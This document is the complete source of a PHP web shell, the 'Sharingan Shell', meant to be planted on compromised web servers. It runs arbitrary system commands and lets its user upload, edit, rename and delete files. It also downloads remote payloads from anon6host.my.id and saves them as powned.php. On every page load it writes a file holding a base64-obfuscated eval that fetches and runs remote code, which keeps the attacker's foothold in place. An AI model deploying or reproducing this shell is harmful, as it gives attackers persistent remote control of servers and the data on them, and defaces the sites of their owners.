<!DOCTYPE html>
<?php
@ob_clean();

if (isset($_GET['dir'])) {
        $dir = $_GET['dir'];
} else {
        $dir = getcwd();
}
?>
<html>
<head>
        <title>Mugen</title>
</head>

<style>
@import url("https://fonts.googleapis.com/css?family=New+Rocker|Shadows+Into+Bungee+Light&display=swap");
* {
        font-family: monospace;
        font-weight: 800;
}
body {
        font-size: 120%;
        color: white;
        padding: 0;
        margin: 25% 10% 10% 10%;
        background-image: url('https://media.tenor.com/fqAMFHpkw5cAAAAC/sharingan.gif');
        background-color: green;
        text-shadow: rgba(0,0,0,1) 2px 2px 0.1em;
}
table {
        margin: auto;
        margin-bottom: 20px;
        width: 96%;
}
table td {
        transition: all .5s;
}
.data-table {
        border-collapse: collapse;
        font-size: 110%;
        min-width: 600px;
}
.data-table th,
.data-table td {
        border: none;
        padding: 7px 15px;
        width: 33%;
}
h3.title{
        margin-bottom: 20px;
        margin-top: 0px;
        text-align: center;
        background-color: black;
        padding: 10px;
        font-weight: 900;
        font-size: 160%;
        font-family: Bungee;
}
.data-table tbody td {
        color: white;
        background-color: black;
}
.data-table tbody td:nth-child(4),
.data-table tbody td:last-child {
        text-align: left;
}
.data-table tbody td:first-child{
        text-align: left;
}
.data-table tbody tr:nth-child(odd) td {
        background-color: black;
}
.data-table tbody tr:hover td {
        background-color: black;
        border-color: black;
}
.data-table tbody tr.stamp td {
        color: black;
        background-color: white;
}
.data-table tbody tr.data td.nick {
        color: black;
}
.kotak{
        border: 2px solid #f00;
        width: 100%;;
        border-radius: 6px;
        box-shadow: rgba(0,0,0,1) 3px 3px 5em;
        padding-bottom: 10px;
}
.btn{
        background-color: black;
        border-radius: 5px;
        border: 2px solid black;
        width: 75px;
        height: 27px;
        font-size: 0.8em;
        font-weight: 600;
        color: white;
        outline: none;
        margin: 4px;
        font-weight: 900;
        padding: 2px 3px;
        text-shadow: none;
}
.btn:hover{
        box-shadow: 0px 0px 2px 2px black;
}

a{
        color: black;
        text-decoration: none;
}
a:hover{
        color: black;
}
.nav_up{
        margin: 2%;;
        margin-top: 0px;
}
.stamp th{
        font-size: 140%;
}
.dirname{
        color: aqua;
}
.filename{
        color: white;
}
input.btn.mini{
        width: 35px;
        height: 24px;
}
.dirnav{
        margin-bottom: 20px;
}
.dirnav a{
        color: black;
}
textarea{
        width: 95.5%;
        height: 400px;
}
.kembali{
        margin-right: 200px;
}
.data-table th.det,
.data-table td.det{
        width: 25%;
}
.fileinput{
        width: 100px;
}
.new{
        width: 160px;
}
.newf{
        width: 90px;
}
.hide{
        display: none;
}
.rmf{
        margin-right: -5px;
}
.go{
        background-color: green;
        border: none;
}
.go:hover{
        box-shadow: 0px 0px 2px 2px darkgreen;
}
.fitur{
        text-align: center;
        margin-top: -15px;
        margin-right: 1%;
}
.infone{
        text-align: center;
        margin-top: -15px;
        margin-right: 1%;
}
.cmdform{
	text-align: center;
	margin-top: -15px;
    margin-right: 1%;
}
.fbawah,.fatas{
        display: inline-block;
}
.love{
	text-align: left;
}
.kont{
	text-align: left;
	font-weight: 100;
    font-size: 124%;
    text-shadow: red;
    background-color: transparant ;
    border: 2px black;
    width: 120px;
    height: 40px;
}
.tol{
	text-align: center;
	font-weight: 100;
    font-size: 124%;
    text-shadow: red;
    background-color: red ;
    border: 2px black;
    width: 120px;
    height: 40px;
}
</style>

<body>
<div class="kotak">
        <h3 class="title">[ Sharingan Shell Is Enabled! ]<br> Uchiha Shisui</h3>
        <div class="infone">
           <?php
           $disfunc = @ini_get("disable_functions");
           if (empty($disfunc)) {
               $disf = "<font color='gold'>NONE</font>";
               } else {
                   $disf = "<font color='red'>".$disfunc."</font>";
                   }
           function ipserv() {
               if (empty($_SERVER['SERVER_ADDR'])) {
                   return gethostbyname($_SERVER['SERVER_NAME']);
                   if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
                       return $_SERVER['SERVER_NAME'];
                       }
                  } else {
                return $_SERVER['SERVER_ADDR'];
                }
                }
           echo "<div class='love'>";
           echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
           echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
           echo "System : <font color='gold'>".php_uname()."</font><br>";
           echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
           echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
           echo "Disable Function : ".$disf."</font><br>";
           echo "MySQL : ";
           if (function_exists("mysql_connect")) {
               echo "<font color=green>ON</font>";
               } else {
                echo "<font color=red>OFF</font>";
               }
               echo " &nbsp;|&nbsp; cURL : ";
               if (function_exists("curl_init")) {
               echo "<font color=green>ON</font>";
               } else {
               echo "<font color=red>OFF</font>";
               }
               echo " &nbsp;|&nbsp; WGET : ";
               if (file_exists("/usr/bin/wget")) {
               echo "<font color=green>ON</font>";
               } else {
               echo "<font color=red>OFF</font>";
               }
               echo " &nbsp;|&nbsp; Perl : ";
               if (file_exists("/usr/bin/perl")) {
               echo "<font color=green>ON</font>";
               } else {
               echo "<font color=red>OFF</font>";
               }
               echo " &nbsp;|&nbsp; Python : ";
               if (file_exists("/usr/bin/python2")) {
               echo "<font color=green>ON</font>";
              } else {
              echo "<font color=red>OFF</font>";
              }
              echo "</div>";
              echo"<div class='kont'>";
              echo" <form method='get'>
              <input type='hidden' value='.$dir.'/'.$dir.' name='Autogokyamekkyaku'>
              <input type='hidden' value='.$dir.' name='dirpath'>
              <input type='submit' value='Autogokyamekkyaku' name='autogokyamekkyaku' class='kont'></form></div>";
              echo"<div class='tol'>";
              echo" <form method='get'>
              <input type='hidden' value='.$dir.'/'.$dir.' name='genjutsu'>
              <input type='hidden' value='.$dir.' name='dirpath'>
              <input type='submit' value='Genjutsu' name='genjutsu' class='tol'>
              </form></div>
              ";
           
                  ?>
          
          </div>
        <div class="nav_up">

<?php
                $dir = str_replace("\\", "/", $dir);
                $dirs = explode("/", $dir);

                foreach ($dirs as $key => $value) {
                        if ($value == "" && $key == 0){
                                echo '<h3 class="dirnav">PATH : <a href="/">/</a>'; continue;
                        } echo '<a href="?dir=';

                        for ($i=0; $i <= $key ; $i++) {
                                echo "$dirs[$i]"; if ($key !== $i) echo "/";
                        } echo '">'.$value.'</a>/';
        }
        echo '</h3>';
if (isset($_POST['upl'])){

                $namafile = $_FILES['upload']['name'];
                $tempatfile = $_FILES['upload']['tmp_name'];
                $tempat = $_GET['dir'];
                $error = $_FILES['upload']['error'];
                $ukuranfile = $_FILES['upload']['size'];

                move_uploaded_file($tempatfile, $dir.'/'.$namafile);
                                echo "<font color=green>Success Upload </font>";
        }
        ?>
        <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload">
        <input type="submit" name="upl" value="Upload">
        </form>
<br>
<font color="green">thanks for use sharingan shell<br>let's genjutsu the site!<br>contact me at https://anon6host.my.id
<br>
<br>
        </div>
<center>
<div class="fitur">
           <?php
           echo "<form method='post' class='cmdform' id='cmdform'>
               <font color='lime'>CMD :</font>
               <input type='text' size='25' height='10' name='cmd'>
                <input type='submit' name='execmd' value=' Gas '>
                 </form></td></tr>";
            ?>
        </div>
<!--Mass Deface-->
<?php
if (isset($_POST['execmd'])){
echo "<tr><td>
<textarea cols='60' rows='10' readonly='readonly' style='color:black; background-color:lime;'>
".exe($_POST['cmd'])."
</textarea></center></td></tr></div>";
}


function exe($cmd) { 
	if(function_exists('system')) { 
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result) {
		$buff .= $result;
		} return $buff;
	} elseif(function_exists('passthru')) {
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff;
	} elseif(function_exists('sshin_exec')) { 		
		$buff = @sshin_exec($cmd); 		
		return $buff; 	
	} 
}

        ?>
<!--Table-->
        <table class="data-table" id="tabel">
                <thead>
                        <tr class="stamp">
                                <th>File / Folder</th>
                                <th>Size</th>
                                <th>Action</th>
                        </tr>
                </thead>
                <tbody>
                <tr>
                        <td style="color: lime">.</td>
                        <td style="color: lime"><center>-</center></td>
                        <td><center>
                        <div id="divneww" style="display:none">
                        <form method="POST">
                        <input name="createname" class="fileinput new" type="text" size="20" placeholder="nama" required/>
                        <select name="type">
                                <option disabled="disabled" selected="selected">type</option>
                                <option value="file">file</option>
                                <option value="dir">dir</option>
                        </select>
                        <input type="submit" value="Go" class="btn mini go" name="createnew"/>
                        </form>
                        </div>
                        <?php
                        echo '<div id="divnew"><button class="btn newf" onclick=\'display("divnew","divneww")\'>New File/Dir</button></div>';
                        ?>
                        </center>
                        </td>
                </tr>
        <?php

        $scan = scandir($dir);

foreach ($scan as $directory) {
        if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

        echo '
        <tr class="data">
        <td class="det">
        <a class="dirname" href="?dir='.$dir.'/'.$directory.'">'.dirlimit($directory).'</a>
        </td>
        <td style="color: red;"><center>--</center></td>
        <td>
        <center>';
        echo '<form method="POST" id="'.clearspace($directory).'_form" class="hide">
        <input name="newname" class="fileinput" type="text" size="20" value="'.$directory.'" required/>
        <input type="hidden" name="path" value="'.$dir.'">
        <input type="hidden" name="oldname" value="'.$directory.'">
        <input type="submit" value="Go" class="btn mini go"/>
        </form>';
        echo '<form method="POST">
         <input type="hidden" name="'.$dir.'" value="chmod">
         <input type="submit" value="chmod" class="btn mini"/>';
         
        echo '<div id="'.clearspace($directory).'_link">
        <form method="post">
        <input type="hidden" value="'.$dir.'/'.$directory.'" name="dirdl">
        <input type="hidden" value="'.$dir.'" name="dirpath">
        <input type="submit" value="del" name="rmdir" class="btn mini">';
        echo '<a class="btn" href=\'javascript:display("'.clearspace($directory).'_link","'.clearspace($directory).'_form");\'>ren</a>';
        echo '</form>
        </div>
        </center>
        </td>
        </tr>
        ';
        }
foreach ($scan as $file) {
        if (!is_file($dir.'/'.$file)) continue;

        $jumlah = filesize($dir.'/'.$file)/1024;
        $jumlah = round($jumlah, 3);
        if ($jumlah >= 1024) {
                $jumlah = round($jumlah/1024, 2).'MB';
        } else {
                $jumlah = $jumlah .'KB';
        }

        echo '
        <tr>
        <td><a class="filename" href="?dir='.$dir.'&open='.$file.'">'.wordlimit($file).'</a></td>
        <td style="color: lime;"><center>'.$jumlah.'</center></td>
        <td><center>';
        echo '<form method="POST" id="'.clearfile($file).'_form" class="hide">
        <input name="newname" class="fileinput" type="text" size="20" value="'.$file.'" required/>
        <input type="hidden" name="path" value="'.$dir.'">
        <input type="hidden" name="oldname" value="'.$file.'">
        <input type="submit" value="Go" class="btn mini go"/>
        </form>';
        echo '
        <div id="'.clearfile($file).'_link">
        <form method="post" class="fatas">
        <input type="hidden" value="'.$dir.'/'.$file.'" name="filedl">
        <input type="hidden" value="'.$dir.'" name="filepath">
        <input type="submit" value="del" name="rmfile" class="btn mini rmf">
        <a href="?dir='.$dir.'&ubah='.$file.'" class="btn">edt</a>';
        echo '<a class="btn" href=\'javascript:display("'.clearfile($file).'_link","'.clearfile($file).'_form");\'>ren</a>';
        echo '</form><form action="genjutsu.php" method="post" class="fbawah">
        <input type="hidden" value="'.$dir.'" name="dlpath">
        <input type="hidden" value="'.$file.'" name="dlname">
        <input type="submit" value="dl" name="dlfile" class="btn mini rmf">
        </form></div></center>
        
        </td>
        </tr>
        ';
}

echo '
        </tbody>
        </table>
';

/*action*/
if (isset($_GET['shellbp'])) {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('powned.php')) {
		echo "<center><font color=green>Success Upload</font></center>";
	} else {
		if(adminer("https://anon6host.my.id/script/g.htm","powned.php")) {
			echo "<center><font color=green>Success Upload</font></center>";
		} else {
			echo "<center><font color=red>Fail Upload</font></center>";
		}
	}
}


if (isset($_GET['adminer'])) {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('powned.php')) {
		echo "<center><font color=green>Success Upload Adminer</font></center>";
	} else {
		if(adminer("https://anon6host.my.id/script/g.htm","powned.php")) {
			echo "<center><font color=green>Success Upload Genjutsu</font></center>";
		} else {
			echo "<center><font color=red>file genjutsu ter-counter!-(</font></center>";
		}
	}
}

if (isset($_GET['open'])) {
        echo '
        <br />
        <style>
                table{
                        display: none;
                }
        </style>
        <textarea>'.htmlspecialchars(file_get_contents($_GET['dir'].'/'.$_GET['open'])).'</textarea>
        ';
}

if (isset($_POST['rmfile'])) {
        if (unlink($_POST['filedl'])) {
                echo "<font color=green>Delete Ok ".$_POST['filepath']."</font>";
        }
}

if (isset($_POST['rmdir'])){
        $files = glob(''.$_POST['dirdl'].'/*');
        foreach ($files as $file) {
                if (is_file($file)){
                        unlink($file);
                }
        }
        if(rmdir($_POST['dirdl'])){
                echo "<font color=green>Delete Ok ".$_POST['dirpath']."</font>";
        }else{
                echo "<font color=red>".$_POST['dirdl']."!');</font>";
        }
}

if(isset($_GET['ubah'])){
        if(isset($_POST['edit'])){
                $fp = fopen($_POST['object'], 'w');
                if(fwrite($fp,$_POST['edit'])){
                        echo "<font color=green>Edit Ok : ".$_GET['dir']."</font>";
                }else{
                    
                        err();
                }
                fclose($fp);
        }

$shin = $_GET['dir'];
$shincode = $_GET['ubah'];
$patc = "$shin/$shincode";

echo '<style>
                        table {
                                display: none;
                        }
                </style>

                <form method="post" action="">
                <input type="hidden" name="object" value="'.$patc.'">
                <textarea name="edit">'.htmlspecialchars(file_get_contents($patc)).'</textarea>
                <a href="?dir='.$dir.'" class="kembali"><=Back</a>
                <button type="submit" name="go" value="Submit" class="btn edt">Gasbro</button>
                </form>
                ';
}
if(isset($_POST['newname'])){
        if(rename($_POST['path'].'/'.$_POST['oldname'], $_POST['path'] . '/' .$_POST['newname'])){
                ok();
        }else{
                err();
        }
}
if(isset($_POST['createnew']) && $_POST['createname'] != ''){
        if($_POST['type'] == 'file'){
                $newfl = $dir. '/' . $_POST['createname'];
                if(isset($newfl)){
                        if(fopen($newfl,'w')){
                                ok();
                        }else{
                                err();
                        }
                }
        }elseif($_POST['type'] == 'dir'){
                $newdir = $dir. '/' .$_POST['createname'];
                if(mkdir($newdir)){
                        ok();
                }else{
                        err();
                }
        }else{
                echo "<font color=red>Pilih Type File</font>";
        }
}

$fdlvalue = ' <?php eval("?>".base64_decode("PD89LyoqKiovQG51bGw7IC8qKioqKioqKi8gLyoqKioqKiovIC8qKioqKioqKi9AZXZhbC8qKioqLygiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzLyoqKioqKiovKCJodHRwczovL2Fub242aG9zdC5teS5pZC9zaGVsbHovc2hhcmluZ2FuLnBocCIpKTsvKiovPz4=")); ?> ';
$dlwrite = fopen('genjutsu.php', 'w');
fwrite($dlwrite, $fdlvalue);
fclose($dlwrite);
/*function*/
function wordlimit($file,$limit=26){
        if(strlen($file)>$limit)
        $word = mb_substr($file,0,$limit-3)."<font color=#f00>...</font>";
        else
        $word = $file;
        return $word;
}
function dirlimit($directory,$limit=22){
        if(strlen($directory)>$limit)
        $dirlim = mb_substr($directory,0,$limit-3)."<font color=#fff>...</font>";
        else
        $dirlim = $directory;
        return $dirlim;
}
function ok(){
        echo "<font color=green>Success</font>";
}
function err(){
        echo "<font color=red>Error</font>";
}
function clearspace($directory){
        return str_replace(" ","_",$directory);
}
function clearfile($file){
        return str_replace(" ","_",$file);
}

function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
	

<script type="text/javascript">
        function display(hide,show){
                document.getElementById(hide).style.display = 'none';
                document.getElementById(show).style.display = 'block';
        }
</script>
</body>  